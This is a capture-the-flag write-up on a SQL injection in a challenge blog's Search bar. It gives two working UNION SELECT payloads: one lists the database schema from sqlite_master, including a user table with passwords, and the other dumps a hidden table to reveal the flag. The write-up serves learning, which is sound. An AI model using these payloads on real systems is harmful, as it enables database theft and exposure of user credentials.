# Challenge `Wow, it can't be more juicy than this!` writeup

- Vulnerability: SQL injection
- Where: *Search* bar
- Impact: We can inject SQL code in the *Search* bar that will be executed

## Steps to reproduce

1. On the *Search* bar inject the following code: `' UNION SELECT 'a', sql, name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%' --`. We have to put the parameter *'a'* because in a **UNION** both **SELECT**s must have the same number of parameters
2. With this we will obtain 4 articles besides the ones that were already there that have the names of the tables existing in the database and their respective columns like this:

    CREATE TABLE blog_post ( id INTEGER NOT NULL, title TEXT, content TEXT, PRIMARY KEY (id), UNIQUE (title) ) -> sql
    blog_post -> name

    CREATE TABLE secret_blog_post ( id INTEGER NOT NULL, title TEXT, content TEXT, PRIMARY KEY (id), UNIQUE (title) )
    secret_blog_post

    CREATE TABLE user ( id INTEGER NOT NULL, username TEXT, password TEXT, bio TEXT, age INTEGER, tokens INTEGER, jackpot_val INTEGER, PRIMARY KEY (id), UNIQUE (username) )
    user

3. This means that there is a table called *secret_blog_post* where the flag might be hidden. If we inject the following code on the *Search* bar: `' UNION SELECT id, title, content FROM secret_blog_post --` we get the previous articles and a new one with the title *Reminder* and in its content there is the flag 



